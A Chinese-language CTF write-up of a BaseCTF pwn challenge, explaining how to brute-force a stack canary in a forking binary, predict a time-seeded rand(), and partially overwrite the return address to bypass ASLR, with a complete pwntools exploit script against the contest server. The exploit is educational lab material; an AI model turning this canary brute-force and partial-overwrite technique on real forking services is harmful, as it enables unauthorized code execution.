# basectf 没有Canary我要死了

 by Maple

有fork，还有Canary保护，那应该是爆破Canary，可以看[这里](../../basic/Canary.md)

在这之前还有伪随机数的利用

然后还有一个shell函数，里面是`  return system("/bin/cat flag");`这里也是直接爆破绕过ASLR

可以调试得到shell的偏移是0x02B1，由于程序不会崩溃，所以可以多次尝试，因为ASLR以页为单位随机化，所以直接每次`+0x1000`就好

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
#context(os='linux', arch='amd64',log_level='debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#p = process('./pwn')
p = remote('gz.imxbt.cn',20467)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
seed = libc.time(0)
libc.srand(seed)
#-------爆破Canary-------
canary = b'\x00'
for i in range(7):
    for j in range(256):
        num = libc.rand()%50
        p.sendline(str(num))
        payload = b'a'*0x68+canary+p8(j)
        p.send(payload)
        p.recvuntil('welcome\n')
        rec = p.readline()

        if b'smashing' not in rec:
            print(f'find{i+1}')
            canary +=p8(j)
            break
#log.info('Canary；'+hex(u64(canary)))

shell = 0x02B1

while(1):
    for i in range(16):
        num = libc.rand()%50
        p.sendline(str(num))

        payload = b'a'*0x68+canary+b'a'*0x8+p16(shell)
        p.send(payload)
        rec = p.readline()
        log.info(rec)

        if b'welcome' in rec:
            p.readline()
            shell+=0x1000
            continue
        else:
            break
p.interactive()
```

